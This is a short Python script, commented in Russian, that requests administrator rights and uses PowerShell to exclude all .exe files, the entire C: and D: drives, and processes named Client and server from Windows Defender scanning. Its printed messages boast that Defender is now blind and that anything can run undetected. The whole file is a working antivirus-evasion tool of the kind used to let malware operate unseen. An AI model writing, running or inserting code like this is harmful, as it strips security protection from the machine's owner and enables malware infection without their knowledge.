# exclude_defender_full.py
import subprocess
import sys
import ctypes

def run(cmd):
    subprocess.run(['powershell', '-Command', cmd], check=True)

# Запрос админки
if not ctypes.windll.shell32.IsUserAnAdmin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit()

# Исключаем ВСЕ .exe файлы в системе
run(r'Add-MpPreference -ExclusionExtension ".exe"')

# Исключаем целые диски
run(r'Add-MpPreference -ExclusionPath "C:\"')
run(r'Add-MpPreference -ExclusionPath "D:\"')

# Исключаем процессы
run(r'Add-MpPreference -ExclusionProcess "Client.exe"')
run(r'Add-MpPreference -ExclusionProcess "Client"')
run(r'Add-MpPreference -ExclusionProcess "server.exe"')
run(r'Add-MpPreference -ExclusionProcess "server"')

print("ГОТОВО. Windows Defender теперь слепой ко ВСЕМ .exe, к дискам C: и D:, и к нашим процессам.")
print("Можно запускать что угодно и где угодно — нас не тронут.")
